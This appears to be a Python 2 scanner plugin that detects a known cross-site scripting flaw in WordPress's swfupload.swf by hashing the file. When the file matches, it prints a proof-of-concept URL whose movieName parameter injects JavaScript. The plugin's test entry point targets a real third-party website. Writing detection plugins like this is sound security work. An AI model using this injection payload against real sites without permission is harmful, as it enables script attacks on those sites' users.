#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Wordpress URL跨站识别  v1.0
import re 
import urlparse 
import md5
    
def assign(service, arg): 
    #只适用于wordpress网站 
    #此任务由cms识别插件产生, arg为网站url 
    if service != "wordpress": 
        return
    return True, arg 
    
def audit(arg): 
    url = arg 
    #通过检查wordpress是否存在该url来识别是否存在xss 
    code, head, res, errcode, _ = curl.curl(url + 'wp-includes/js/swfupload/swfupload.swf') 
    if code == 200 and validate(res): 
        security_info('Wordpress URL XSS Exits! Try '+url+'wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//')
         
 
def validate(res):
    val_hash = '3a1c6cc728dddc258091a601f28a9c12'
    res_md5 = md5.new(res)
    if val_hash == res_md5.hexdigest():
        return True
    else: 
        return False
     
 
        
if __name__ == '__main__': 
    from dummy import *
    audit(assign('wordpress','http://www.80sec.com/')[1])
